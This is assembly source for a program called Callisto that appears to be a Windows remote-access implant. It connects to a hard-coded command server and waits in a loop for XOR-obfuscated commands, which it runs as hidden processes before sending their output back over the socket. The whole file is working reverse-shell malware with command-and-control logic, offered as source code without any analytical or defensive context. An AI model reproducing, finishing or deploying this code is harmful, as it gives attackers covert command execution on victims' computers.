;  <callisto.asm>   -   Callisto source
;                         Copyright (c) 2020 by Joshua Finley.
;

option win64:3      ; init shadow space, reserve stack at PROC level

include ..\include\kernel32.inc
include ..\include\winsock.inc
include ..\include\ntdll.inc

status_failure  equ 0xffffffff

; Shellcode commands
buffer_size     equ 1024
cmd_null        equ 0000b
cmd_hello       equ 0001b
cmd_ready       equ 0010b
cmd_exec        equ 0100b
cmd_exit        equ 1000b

; Function prototypes
memcpy      proto   fastcall :qword, :qword, :dword
xor_cipher  proto   fastcall :qword, :byte, :dword
system_exec proto   fastcall :qword

_data$00 segment page 'data'
    g_command_ip        db "127.0.0.1", 0
    g_command_port      dw 1664
    timeout             timeval <>
    g_timeout           dw 5
    g_timeout_usec      dw 0
_data$00 ends

_text$00 segment align(10h) 'code'

    main proc
        local socket_buffer[buffer_size]:byte
        local wsa_data:wsadata
        local sock_addr:sockaddr_in
        local dw_socket:dword
        local dw_socket_buffer_size:dword
        local cipher_key:byte
        ; Initialize Winsock
        invoke WSAStartup, 516, addr wsa_data
        test eax, eax
        jnz _exit
        
        ; Create a socket
        invoke socket, af_inet, sock_stream, ipproto_tcp
        cmp eax, socket_error
        je _exit
        mov dw_socket, eax

        ; Setup connection information
        invoke RtlZeroMemory, addr sock_addr, sizeof sockaddr_in
        invoke inet_addr, addr g_command_ip
        mov sock_addr.sin_addr, eax
        mov sock_addr.sin_family, af_inet
        invoke htons, g_command_port
        mov sock_addr.sin_port, ax

        ; Set receive timeout
        mov ax, g_timeout
        mov timeout.tv_sec, ax
        mov ax, g_timeout_usec
        mov timeout.tv_usec, ax
        invoke setsockopt, dw_socket, sol_socket, so_rcvtimeo, addr timeout, sizeof timeval
        cmp eax, socket_error
        je _exit

        ; Connect to command server 
    _connect:
        invoke connect, dw_socket, addr sock_addr, sizeof sock_addr
        cmp eax, socket_error
        je _exit

        ; Send the client hello
        invoke RtlZeroMemory, addr socket_buffer, buffer_size
        mov byte ptr [socket_buffer], cmd_hello
        invoke send, dw_socket, addr socket_buffer, sizeof byte, 0

        ; Check server hello
        invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
        cmp eax, socket_error
        je _exit
        cmp byte ptr [socket_buffer], cmd_hello
        jne _exit

        ; Successfuly connected to command server; await commands
        .while 1
            ; Signal the client is ready
            invoke RtlZeroMemory, addr socket_buffer, buffer_size
            mov byte ptr [socket_buffer], cmd_ready
            invoke send, dw_socket, addr socket_buffer, sizeof byte, 0

            ; Check if the server is ready
            mov byte ptr [socket_buffer], 0
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            .if eax == socket_error
                jmp _reconnect
            .endif
            cmp byte ptr [socket_buffer], cmd_ready
            
            ; If nothing sent
            .if eax == 0
                .continue   
            .elseif byte ptr [socket_buffer] == cmd_exit ; exit now
                jmp _reconnect
            .endif

            ; Check if command key sent
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            .if eax == socket_error
                jmp _reconnect
            .elseif byte ptr [socket_buffer] != cmd_exec
                jmp _reconnect
            .endif

            ; Receive the next cipher key
            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
            cmp eax, socket_error
            je _reconnect
            mov al, byte ptr [socket_buffer]
            mov [cipher_key], al

            ; Receive the next command
            invoke recv, dw_socket, addr socket_buffer, buffer_size, 0
            cmp eax, socket_error
            je _reconnect

            ; Continue if the server has nothing for the client
            .if eax == 0
                .continue
            .endif

            ; Save the size of the last command
            mov dw_socket_buffer_size, eax
            
            ; Check if exit command was sent
            mov al, byte ptr [socket_buffer]
            cmp al, cmd_exit
            je _exit

            ; Decipher the supplied command
            invoke xor_cipher, addr socket_buffer, cipher_key, buffer_size

            ; Run the supplied command 
            invoke system_exec, addr socket_buffer
            .if eax == status_failure || eax == 0
                .continue
            .endif
            
            ; Return the result
            invoke send, dw_socket, addr socket_buffer, eax, 0
            .continue
        .endw
        jmp _reconnect
    _exit:
        invoke WSACleanup
        ret

    _reconnect:
        invoke shutdown, dw_socket, sd_both
        jmp _connect
    main endp

    xor_cipher proc fastcall uses rbx r8, buffer_addr:qword, key:byte, xor_buffer_size:dword
        mov dl, key                 ; Move the XOR key into rdx
        mov r8d, xor_buffer_size    ; Move the size into r8 (loop counter)
        
    _xor_next_byte:
        lea rbx, [rcx + r8 - 1]     ; Load effective address of the current byte
        xor rax, rax                ; Clear rax (ensure only lower 8 bits are used)
        movzx rax, byte ptr [rbx]   ; Move the byte into al, zero-extending to rax
        xor al, dl                  ; XOR the byte with the key
        mov [rbx], al               ; Store the result back into the buffer
        dec r8                      ; Decrement the loop counter
        jne _xor_next_byte          ; Jump if there are more bytes to process
        ret
    xor_cipher endp

    system_exec proc fastcall uses r8, command_buffer:qword
            local pipe_buffer[buffer_size]:byte
            local startup_info:startupinfoa
            local process_info:process_information
            local sec_attributes:security_attributes
            local read_pipe:qword
            local write_pipe:qword
            local bytes_read:dword
            local status:sword
            ; Initialize process info handles to invalid values (for checks in _error)
            mov process_info.hThread, -1
            mov process_info.hProcess, -1

            ; Initialize the local structures to zero
            invoke RtlZeroMemory, addr startup_info, sizeof startup_info
            invoke RtlZeroMemory, addr process_info, sizeof process_info
            invoke RtlZeroMemory, addr sec_attributes, sizeof sec_attributes

            ; Set security attributes to allow handle inheritance
            mov sec_attributes.nLength, sizeof sec_attributes
            mov sec_attributes.bInheritHandles, 1
            mov sec_attributes.lpSecurityDescriptor, 0

            ; Create pipes for standard output and error redirection
            invoke CreatePipe, addr read_pipe, addr write_pipe, addr sec_attributes, 0
            test eax, eax
            jz _error

            ; Ensure the write handle to the pipe for STDOUT is not inherited
            invoke SetHandleInformation, write_pipe, handle_flag_inherit, 0

            ; Prepare startupinfo structure
            mov startup_info.cbsize, sizeof startupinfoa
            mov startup_info.dwflags, startf_usestdhandles or startf_useshowwindow
            mov startup_info.wShowWindow, sw_hide
            mov rax, [read_pipe]
            mov startup_info.hStdOutput, rax
            mov rax, [write_pipe]
            mov startup_info.hStdError, rax

            ; Create the process
            invoke CreateProcessA, 0, command_buffer, 0, 0, 0, 0, 0, 0, addr startup_info, addr process_info
            test eax, eax
            je _error
            invoke RtlZeroMemory, addr command_buffer, buffer_size

            ; Close the write end of the pipe before reading from the read end
            invoke CloseHandle, write_pipe
            mov write_pipe, 0

            ; Read the output from the child process
            .while 1
                invoke RtlZeroMemory, addr pipe_buffer, buffer_size
                invoke ReadFile, read_pipe, addr pipe_buffer, buffer_size -1, addr bytes_read, 0
                test eax, eax
                jz _error
                invoke memcpy, addr command_buffer, pipe_buffer, buffer_size
                mov eax, dword ptr [bytes_read]
                mov dword ptr [status], eax
                jmp _exit
            .endw
        _error:
            mov dword ptr [status], status_failure
        _exit:
            ; If the handles are open, close them
            .if process_info.hProcess != -1 && process_info.hProcess != 0
                invoke CloseHandle, process_info.hProcess
            .endif
            .if process_info.hThread != -1 && process_info.hThread != 0
                invoke CloseHandle, process_info.hThread
            .endif
            .if write_pipe != -1 && write_pipe != 0
                invoke CloseHandle, write_pipe
            .endif
            .if read_pipe != -1 && read_pipe != 0
                invoke CloseHandle, read_pipe
            .endif

            mov eax, dword ptr [status]
            ret
    system_exec endp

    memcpy proc fastcall uses rdi rsi, dest:ptr, src:ptr, count:dword
        ; Load the parameters into the appropriate registers
        mov rdi, rcx       ; rdi <- dest
        mov rsi, rdx       ; rsi <- src
        mov ecx, r8d       ; rcx <- count (number of bytes to copy)

        ; Check if there's anything to copy
        test ecx, ecx
        jz done            ; If count is zero, exit

        ; Copy bytes from src to dest
    copy_loop:
        mov al, [rsi]      ; Load byte from source
        mov [rdi], al      ; Store byte in destination
        inc rsi            ; Increment source pointer
        inc rdi            ; Increment destination pointer
        dec ecx            ; Decrement byte count
        jnz copy_loop      ; Repeat if there are more bytes to copy

    done:
        ret                ; Return to caller
    memcpy endp

_text$00 ends

end